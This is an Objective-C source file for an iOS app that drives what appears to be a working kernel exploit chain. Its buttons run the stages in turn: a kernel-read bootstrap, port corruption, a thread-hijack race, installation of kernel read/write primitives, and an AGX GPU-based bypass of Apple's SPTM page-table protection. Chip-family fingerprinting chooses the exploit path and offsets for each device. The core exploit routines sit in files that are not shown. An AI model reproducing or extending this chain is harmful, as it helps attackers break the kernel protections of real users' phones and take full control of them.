#import <UIKit/UIKit.h>
#import <mach/mach.h>
#import <sys/sysctl.h>
#import <sys/utsname.h>
#import <sys/stat.h>

#import "entry1_src/kread_bootstrap.h"
#import "entry1_src/kernel_primitives.h"
#import "entry1_src/sptm_bypass.h"
#import "entry1_src/stabilize.h"
#import "entry1_src/agx_internal.h"

#define CTX_SIZE 16384

@interface SPTMTestViewController : UIViewController
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, strong) NSMutableString *logBuffer;
@property (nonatomic, assign) BOOL logUpdatePending;
- (void)appendRawLine:(const char *)line length:(int)len;
@end

static __unsafe_unretained SPTMTestViewController *g_ui_log_target = nil;

static void SPTMTestViewController_UILogBridge(const char *line, int len) {
    SPTMTestViewController *vc = g_ui_log_target;
    if (!vc || !line || len <= 0) return;
    [vc appendRawLine:line length:len];
}

@implementation SPTMTestViewController

- (void)viewDidLoad {
	[super viewDidLoad];
	self.title = @"SPTM Test";
	self.view.backgroundColor = UIColor.blackColor;

	self.logView = [[UITextView alloc] initWithFrame:CGRectZero];
	self.logView.backgroundColor = UIColor.blackColor;
	self.logView.textColor = UIColor.whiteColor;
	self.logView.font = [UIFont fontWithName:@"Menlo" size:11];
	self.logView.editable = NO;
	self.logView.indicatorStyle = UIScrollViewIndicatorStyleWhite;
	self.logView.translatesAutoresizingMaskIntoConstraints = NO;
	[self.view addSubview:self.logView];

	UIStackView *buttons = [[UIStackView alloc] init];
	buttons.axis = UILayoutConstraintAxisVertical;
	buttons.spacing = 8;
	buttons.distribution = UIStackViewDistributionFillEqually;
	buttons.translatesAutoresizingMaskIntoConstraints = NO;
	[self.view addSubview:buttons];

	[buttons addArrangedSubview:[self makeButton:@"1. Kread Bootstrap"
										 action:@selector(runKreadBootstrap)
										  color:UIColor.darkGrayColor]];
	[buttons addArrangedSubview:[self makeButton:@"2. SPTM Bypass"
										 action:@selector(runSPTMBypass)
										  color:UIColor.darkGrayColor]];
	[buttons addArrangedSubview:[self makeButton:@"Teardown"
										 action:@selector(runTeardown)
										  color:UIColor.darkGrayColor]];
	[buttons addArrangedSubview:[self makeButton:@"Dump + Clear Log"
										 action:@selector(dumpAndClearLog)
										  color:UIColor.darkGrayColor]];

	UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
	[NSLayoutConstraint activateConstraints:@[
		[buttons.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:10],
		[buttons.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-10],
		[buttons.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-10],
		[buttons.heightAnchor constraintEqualToConstant:250],
		[self.logView.topAnchor constraintEqualToAnchor:safe.topAnchor],
		[self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor],
		[self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor],
		[self.logView.bottomAnchor constraintEqualToAnchor:buttons.topAnchor constant:-10],
	]];

	kread_bootstrap_open_log();

	g_ui_log_target = self;
	kread_bootstrap_set_ui_log_callback(SPTMTestViewController_UILogBridge);
	kwrite_set_ui_log_callback(SPTMTestViewController_UILogBridge);

	const char *lp = kread_bootstrap_get_log_path();
	if (kread_bootstrap_log_is_fresh()) {
		if (lp && lp[0] && strncmp(lp, "FAILED", 6) != 0)
			[self log:@"Log file: %s", lp];
		else
			[self log:@"Log file: %s", lp ? lp : "(null)"];
		[self logDeviceInfo];
	} else {
		const char *note = "(previous session log preserved -- press Dump + Clear Log to view)\n";
		[self appendRawLine:note length:(int)strlen(note)];
	}
}

- (UIButton *)makeButton:(NSString *)title action:(SEL)sel color:(UIColor *)color {
	UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
	[btn setTitle:title forState:UIControlStateNormal];
	[btn setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
	btn.backgroundColor = color;
	btn.layer.cornerRadius = 8;
	[btn addTarget:self action:sel forControlEvents:UIControlEventTouchUpInside];
	return btn;
}

#define MAX_UI_LOG_BYTES (64 * 1024)

- (void)log:(NSString *)fmt, ... {
	va_list args;
	va_start(args, fmt);
	NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:args];
	va_end(args);

	NSData *d = [[msg stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding];
	if (d.length) {
		kwlog_raw(d.bytes, (int)d.length);
	}
}

- (void)appendRawLine:(const char *)line length:(int)len {
	if (!line || len <= 0) return;
	NSString *str = [[NSString alloc] initWithBytes:line length:(NSUInteger)len
	                                       encoding:NSUTF8StringEncoding];
	if (!str) return;
	@synchronized (self) {
		if (!self.logBuffer) self.logBuffer = [NSMutableString new];
		[self.logBuffer appendString:str];
		NSUInteger excess = (self.logBuffer.length > MAX_UI_LOG_BYTES)
				? self.logBuffer.length - MAX_UI_LOG_BYTES : 0;
		if (excess > 0)
			[self.logBuffer deleteCharactersInRange:NSMakeRange(0, excess)];
	}
	[self scheduleLogRefresh];
}

- (void)scheduleLogRefresh {

	@synchronized (self) {
		if (self.logUpdatePending) return;
		self.logUpdatePending = YES;
	}
	dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(50 * NSEC_PER_MSEC)),
			dispatch_get_main_queue(), ^{
		NSString *snapshot;
		@synchronized (self) {
			self.logUpdatePending = NO;
			snapshot = [self.logBuffer copy];
		}
		if (!snapshot) return;
		self.logView.text = snapshot;
		NSUInteger len = self.logView.text.length;
		if (len > 0)
			[self.logView scrollRangeToVisible:NSMakeRange(len - 1, 1)];
	});
}

- (void)logDeviceInfo {
	struct utsname u;
	uname(&u);
	[self log:@"Device:  %s", u.machine];
	[self log:@"System:  %s %s", u.sysname, u.release];

	size_t sz = 0;
	sysctlbyname("kern.osversion", NULL, &sz, NULL, 0);
	char *build = malloc(sz);
	sysctlbyname("kern.osversion", build, &sz, NULL, 0);
	[self log:@"Build:   %s", build];
	free(build);

	sz = 0;
	sysctlbyname("hw.model", NULL, &sz, NULL, 0);
	char *model = malloc(sz);
	sysctlbyname("hw.model", model, &sz, NULL, 0);
	[self log:@"Model:   %s", model];
	free(model);

	[self log:@"PID:     %d  UID: %d  GID: %d", getpid(), getuid(), getgid()];
	[self log:@"Task:    0x%x", mach_task_self()];

	uint32_t cpufamily = 0;
	size_t cf_sz = sizeof(cpufamily);
	sysctlbyname("hw.cpufamily", &cpufamily, &cf_sz, NULL, 0);

	uint32_t cpusubfamily = 0;
	size_t csf_sz = sizeof(cpusubfamily);
	sysctlbyname("hw.cpusubfamily", &cpusubfamily, &csf_sz, NULL, 0);

	int ncpu = 0;
	size_t ncpu_sz = sizeof(ncpu);
	sysctlbyname("hw.ncpu", &ncpu, &ncpu_sz, NULL, 0);

	uint32_t xnu_major = 0, xnu_minor = 0, xnu_patch = 0;
	char *xp = strstr(u.version, "xnu-");
	if (xp) sscanf(xp, "xnu-%u.%u.%u", &xnu_major, &xnu_minor, &xnu_patch);
	uint64_t inner = ((uint64_t)(xnu_major & 0x7FFF) << 20)
	               | ((uint64_t)(xnu_minor & 0x3FF) << 10)
	               | ((uint64_t)(xnu_patch & 0x3FF));
	uint64_t kern_ver = inner << 20;

	int path_a = (kern_ver > 0x27120080CFFFFFULL) ||
	             (kern_ver >= 0x225C23801AF00EULL && xnu_major < 10002);

	[self log:@""];
	[self log:@"=== EXPLOIT PATH DETECTION ==="];
	[self log:@"cpufamily:  0x%08X (%d)", cpufamily, (int32_t)cpufamily];
	[self log:@"cpusubfam:  %u", cpusubfamily];
	[self log:@"ncpu:       %d", ncpu];
	[self log:@"xnu:        %u.%u.%u", xnu_major, xnu_minor, xnu_patch];
	[self log:@"kern_ver:   0x%llX", (unsigned long long)kern_ver];
	[self log:@"path:       %s (offsets %d/%d)",
		path_a ? "A" : "C", path_a ? 184 : 176, path_a ? 88 : 80];

	int32_t scf = (int32_t)cpufamily;
	NSString *chipName = @"UNKNOWN";
	uint32_t pflg = 0;
	int bit5 = 0;
	if      (scf == -634136515)  { chipName = @"0xDA33D83D"; pflg = 0x100000;
		if (ncpu < 8 && kern_ver > 0x2711FFFFFFFFFFULL) bit5 = 1;
		else if (ncpu >= 8 && (kern_ver >> 43) > 0x44A) {  } }
	else if (scf == -2023363094) { chipName = @"0x878E5B7A"; pflg = 0x1000000; if (kern_ver > 0x2711FFFFFFFFFFULL) bit5 = 1; }
	else if (scf == 1598941843)  { chipName = @"0x5F464A93"; pflg = 0x1000000; if (kern_ver > 0x2711FFFFFFFFFFULL) bit5 = 1; }
	else if (scf == 1912690738)  { chipName = @"0x720FE032"; pflg = 0x1000000; if (kern_ver > 0x2711FFFFFFFFFFULL) bit5 = 1; }
	else if (scf == -1829029944) { chipName = @"0x931F0068"; pflg = 0x2000; }
	else if (scf == 458787763)   { chipName = @"0x1B59A7B3"; pflg = 0x80000; }
	else if (scf == 1176411346)  { chipName = @"0x462504D2"; pflg = 0x4000; }
	else if (scf == 678884789)   { chipName = @"0x287695B5"; pflg = 0x4000000; bit5 = 1; }
	else if (scf == 747742334)   { chipName = @"0x2C91A47E"; pflg = 0x8000; }
	else if (scf == 131287967)   { chipName = @"0x07D2BBFF"; pflg = 0x1; }
	else if (scf == -400654602)  { chipName = @"0xE82B5D76"; pflg = 0x200; }
	else if (scf == 1741614739)  { chipName = @"0x67C0E793"; pflg = 0x40; }
	else if (scf == 1463508716)  { chipName = @"0x5735FBCC"; pflg = 0x80000; }

	int should_defrag = ((pflg & 0x5184001) != 0) && !bit5;

	[self log:@"chip:       %@ flag=0x%X bit5=%d", chipName, pflg, bit5];
	[self log:@"defrag:     %s", should_defrag ? "YES" : "SKIP"];
	if (pflg == 0) [self log:@"WARNING: unknown cpufamily!"];
	[self log:@"=== END DETECTION ==="];
}

#pragma mark - Kread Bootstrap

- (void)runKreadBootstrap {
	dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{

		kread_bootstrap_open_log();
		const char *logpath = kread_bootstrap_get_log_path();
		[self log:@""];
		[self log:@"=== KREAD BOOTSTRAP ==="];
		if (!logpath || !logpath[0])
			[self log:@"WARNING: no log file created"];
		[self log:@""];

		if (kread_bootstrap_is_established()) {
			[self log:@"KREAD BOOTSTRAP ALREADY ESTABLISHED this launch -- skipping"];
			return;
		}

		int result = kread_bootstrap();
		const char *klog = kread_bootstrap_get_log();

		(void)klog;

		if (result == 0) {
			[self log:@""];
			[self log:@"KREAD BOOTSTRAP SUCCESS"];
		} else {
			[self log:@""];
			[self log:@"KREAD BOOTSTRAP FAILED: %d", result];
		}
	});
}

#pragma mark - Kwrite Primitive Test

- (BOOL)reportDiscriminator:(int)disc {
	switch (disc) {
		case 3:
			[self log:@"=== discriminator=3: T-A landed on a real XNU_PAGE_TABLE page ==="];
			return YES;
		case 1:
			[self log:@"=== discriminator=1: sanity (kobj4) passed, T-A (real PT page) rejected ==="];
			return NO;
		case -10:
			[self log:@"=== discriminator=-10: SANITY (T-S) FAILED on owned page ==="];
			return NO;
		default:
			[self log:@"=== Discriminator setup error: %d ===", disc];
			return NO;
	}
}

- (void)runSPTMBypass {
	dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{

		[self log:@""];

		if (sptm_window_is_installed()) {
			[self log:@"SPTM BYPASS ALREADY ESTABLISHED this launch -- skipping re-exploit"];
			[self log:@"Re-running the final broad-bypass test on the live bypass window..."];
			BOOL ok = [self reportDiscriminator:agx_rerun_final_test()];
			[self log:@""];
			[self log:ok ? @"SPTM bypass (already established): final test rc=0"
			             : @"SPTM bypass (already established): final test rc!=0"];
			return;
		}

		[self log:@"=== entry1 BOOTSTRAP: kernel R/W primitives ==="];

		int result = kwrite_test();
		int bypass_ok = 0;

		if (result == 0) {
			[self log:@"kwrite primitive OK; setting up port corruption (label372)..."];
			mach_port_t l372_port = 0;
			int l372 = label372_setup(&l372_port);
			if (l372 == 0) {
				[self log:@"label372 OK (port=0x%x); hijacking kernel thread (VM-race)...", l372_port];
				int hijack = ppl_race_thread_hijack(l372_port);
				if (hijack == 0) {
					[self log:@"thread hijack OK; installing kread/kwrite primitives..."];
					int krw = init_kernel_rw_primitives(l372_port);
					if (krw == 0) {
						[self log:@"kread/kwrite primitives installed; running post-init..."];
						int pis = post_init_setup(l372_port);
						if (pis == 0) {
							[self log:@"post-init OK; running pa_redirect-based mapping test..."];
							int sb = port_persistence_setup(l372_port);
							if (sb == 0) {
								[self log:@"pa_redirect mapping OK; verifying kernel R/W..."];
								int sv = kernel_rw_verify(l372_port);
								if (sv == 0) {
									[self log:@"=== kernel R/W verified ==="];
									int nkh = init_necp_kernel_handle(l372_port);
									[self log:@"NECP-based kwrite handle: %d", nkh];
									int skw = sptm_kwrite_test(l372_port);
									if (skw == 0) {
										[self log:@"=== NECP kwrite primitive verified ==="];
										[self log:@""];
										[self log:@"=== SPTM BYPASS: setup ==="];
										[self log:@"Userclient: opening AGX userclient + IOConnect setup..."];
										int uct = agx_userclient_setup_test();
										if (uct == 0) {
											[self log:@"Userclient OK (userclient armed)"];
										} else {
											[self log:@"Userclient FAILED: %d", uct];
										}
										[self log:@"Kext locate: locating IOGPUFamily kext in kernelcache..."];
										int kcb = agx_kcache_locate_iogpu_test();
										if (kcb == 0) {
											[self log:@"Kext locate OK (IOGPU kext located)"];
										} else {
											[self log:@"Kext locate FAILED: %d", kcb];
										}
										[self log:@"Kcache scan: kcache pattern scans (extracting 13 struct offsets)..."];
										int kcb2 = agx_kcache_pattern1_test();
										if (kcb2 == 0) {
											[self log:@"Kcache scan OK (offsets extracted)"];
										} else {
											[self log:@"Kcache scan FAILED: %d", kcb2];
										}
										[self log:@""];
										[self log:@"=== SPTM BYPASS: full pipeline (setup -> firmware bring-up -> resolve -> forge -> kwrite) ==="];
										int pdt = agx_broad_bypass();
										if (pdt == 0) {
#if AGX_DOORBELL_FALLBACK
											[self log:@"=== Doorbell fallback: kobj3 PTE flip (FENCE HIT -- see [forge] above) ==="];
											bypass_ok = 1;
#else
											[self log:@"=== AGX bring-up returned OK; running discriminator below ==="];
											int disc = agx_get_discriminator_result();
											if ([self reportDiscriminator:disc]) bypass_ok = 1;
#endif
										} else {
#if AGX_DOORBELL_FALLBACK
											[self log:@"Doorbell fallback FAILED (no FENCE HIT): %d", pdt];
#else
											[self log:@"AGX-DMA bringup FAILED: %d", pdt];
#endif
										}
									} else {
										[self log:@"NECP kwrite test FAILED: %d", skw];
									}
								} else {
									[self log:@"kernel R/W verify FAILED: %d", sv];
								}
							} else {
								[self log:@"pa_redirect mapping FAILED: %d", sb];
							}
						} else {
							[self log:@"post-init FAILED: %d", pis];
						}
					} else {
						[self log:@"kread/kwrite primitive install FAILED: %d", krw];
					}
				} else {
					[self log:@"thread hijack FAILED: %d", hijack];
				}
			} else {
				[self log:@"label372 FAILED: %d", l372];
			}
		}

		const char *klog = kwrite_get_log();
		(void)klog;

		if (bypass_ok) {
#if AGX_DOORBELL_FALLBACK
			[self log:@"doorbell fallback: kobj3 write OK (FENCE HIT)"];
#else
			[self log:@"entry1 bootstrap + SPTM bypass: ALL STAGES OK"];
#endif
		} else if (result != 0) {
			[self log:@"entry1 bootstrap FAILED at kwrite primitive probe: %d", result];
		} else {
			[self log:@"entry1 bootstrap FAILED at a later stage -- see log for the FAILED line"];
		}
	});
}

#pragma mark - Teardown

- (void)dumpAndClearLog {
	const char *lp = kread_bootstrap_get_log_path();
	NSString *path = (lp && lp[0] && strncmp(lp, "FAILED", 6) != 0)
			? [NSString stringWithUTF8String:lp] : nil;
	NSString *content = path ? [NSString stringWithContentsOfFile:path
			encoding:NSUTF8StringEncoding error:nil] : nil;

	NSString *hdr = [NSString stringWithFormat:@"\n=== LAST LOG (%@) ===\n", path ?: @"no log path"];
	[self appendRawLine:hdr.UTF8String length:(int)[hdr lengthOfBytesUsingEncoding:NSUTF8StringEncoding]];

	if (content && content.length > 0) {
		[self appendRawLine:content.UTF8String
		             length:(int)[content lengthOfBytesUsingEncoding:NSUTF8StringEncoding]];
		kread_bootstrap_clear_log();
		const char *done = "\n(log cleared)\n";
		[self appendRawLine:done length:(int)strlen(done)];
	} else {
		const char *empty = "(log is empty)\n";
		[self appendRawLine:empty length:(int)strlen(empty)];
	}
}

- (void)runTeardown {
	dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
		[self log:@""];
		[self log:@"=== Teardown ==="];

		[self log:@"Teardown: closing primitives (revert the kernel-PT hook + release kread bootstrap)..."];
		stabilize_close_primitives();

		[self log:@"Teardown complete."];
	});
}

@end
